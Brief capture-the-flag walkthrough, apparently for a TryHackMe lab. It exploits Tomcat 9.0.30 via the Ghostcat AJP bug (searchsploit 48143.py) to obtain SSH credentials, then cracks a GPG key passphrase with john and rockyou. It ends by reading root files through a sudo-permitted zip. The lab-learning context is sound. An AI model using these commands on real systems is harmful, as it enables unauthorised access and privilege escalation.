export ip=10.10.79.184

# recon and scanning

## nmap
`nmap -sC -sV -oN nmap.log $ip`
- 22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
- 53/tcp   open  tcpwrapped
- 8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
- 8080/tcp open  http       Apache Tomcat 9.0.30


# process
- searching for exploit on tomcat 9.0.30: none found, but a bit of searching around showed there is a popular vulnerability for tomcat which is known as ghostcat, so considering that resembles the name of the ctf, I tried that name with searchsploit and executed the exploit.
  - `python 48143.py $ip` this gave the username and password
- trying this username and password with ssh.
- there 2 files in the home dir of the ssh user, download both to host system
- now we try to decrypt the file using gpg private key which is `tryhackme.asc`
  - `gpg --import tryhackme.asc` this fails as it seems passphrase protected. so we need to crack it.
  - hashing tryhackme.asc using gpg2john
    - `gpg2john tryhackme.asc > hash.txt`
  - now cracking this hash with john
    - `john -w=/usr/share/wordlists/rockyou.txt --format=gpg hash.txt`
  - now that we have the password, we decrypt the credentials file
    - `gpg --decrypt credential.pgp`
  - we get the username and password, so logging in as that user using ssh now.
  - now when we try `sudo -l` we see we can run zip as root.
  - so we can try zipping the `/root` dir where usually the root.txt resides
    - `sudo zip -r root.zip /root`
  - that succeeded, so now we will unzip it and check the dir
    - `unzip root.zip`
    - and indeed we can find the `root.txt` inside this dir which has the final flag.